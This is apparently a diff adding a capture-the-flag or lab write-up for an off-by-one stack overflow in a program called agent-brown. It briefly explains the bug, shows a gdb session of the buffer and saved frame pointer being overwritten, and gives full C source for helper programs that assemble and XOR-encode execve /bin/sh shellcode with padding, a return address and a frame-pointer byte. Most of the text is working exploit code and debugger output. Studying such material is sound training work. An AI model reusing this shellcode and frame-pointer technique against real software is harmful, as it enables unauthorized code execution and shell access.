@@ -1,0 +1,99 @@
+The vulnerability here lied in the c code agent-brown.c. More specifically, it lied in the for 
+loop inside the function flip. The for loop has an incorrect check at "i < n && i <= 64;" which 
+allows for writing to the LSB of the $ebp register. By giving the agent-brown program input 
+containing shellcode, padding, the address of the shellcode in the buffer, and the byte we want to
+change of $ebp, we can change the control of flow of the program to execute the shellcode.
+
+brown@pwnable:~$ invoke -e egg=$(./egg) -d agent-brown $(./arg)
+
+(gdb) break invoke
+Breakpoint 1 at 0x80483ed: file agent-brown.c, line 19.
+(gdb) run
+Starting program: /home/brown/agent-brown ?\?\~?V\(?f\'?f,?+?ӭn\(?v,?????\`???????BINSHaaaaaaaaaaaaaaa??ߟ?
+
+Breakpoint 1, invoke (
+    in=0xbffffd9f "\313?~\251V(\021\340\250f'\251f,\220+\251\323\255n(\255v,\355\240\021\373\251\370`\355\240\310\374\337\337\337\017BIN\017SH", 'a' <repeats 15 times>"\250, \333\337\237\340")
+    at agent-brown.c:19
+19	  flip(buf, in);
+(gdb) x/20x buf
+0xbffffb88:	0x00000000	0xb7ff3fdc	0xbffffc44	0x00000000
+0xbffffb98:	0x00000000	0xb7e5f043	0x0804820e	0x00000000
+0xbffffba8:	0x00c10000	0x00000001	0xbffffd87	0x0000002f
+0xbffffbb8:	0xbffffc0c	0xb7fd2000	0x080484b0	0x080482f0
+0xbffffbc8:	0xbffffbd8	0x0804841d	0xbffffd9f	0xbffffbd8
+(gdb) p $ebp
+$1 = (void *) 0xbffffbc8
+(gdb) s 66 *2
+9	  for (i = 0; i < n && i <= 64; ++i)
+(gdb) s
+12	  while (i < 64)
+(gdb) x/20x buf
+0xbffffb88:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
+0xbffffb98:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
+0xbffffba8:	0xffdce880	0x622fffff	0x732f6e69	0x41414168
+0xbffffbb8:	0x41414141	0x41414141	0x41414141	0xbffffb88
+0xbffffbc8:	0xbffffbc0	0x0804841d	0xbffffd9f	0xbffffbd8
+
+
+source code:
+arg:
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+
+char shellcode[] = 
+	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07" 
+	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d" 
+	"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80" 
+	"\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+char pad[15];
+
+char addr[] = "\x88\xfb\xff\xbf";
+
+char byte[] = "\xc0";
+
+void main()
+	{
+		int i;
+
+		for (i = 0; i < 45; i++)
+			shellcode[i] = shellcode[i] ^ (1u << 5);
+
+		for(i = 0; i < 15; i++){
+			pad[i] = '\x41';
+			pad[i] = pad[i] ^ (1u << 5);
+		}
+
+		for (i = 0; i < 4; i++)
+			addr[i] = addr[i] ^ (1u << 5);
+
+		byte[0] = byte[0] ^ (1u << 5);
+
+		printf("%s%s%s%s", shellcode, pad, addr, byte);
+		
+		// 16 + 45 + 3 + 1 = 65
+}
+
+egg:
+#include <stdio.h>
+
+char shellcode[] = 
+	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07" 
+	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d" 
+	"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80" 
+	"\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+
+
+void main()
+	{
+
+		printf("%s\n", shellcode);
+}
+
+
+
+
+
+egg:
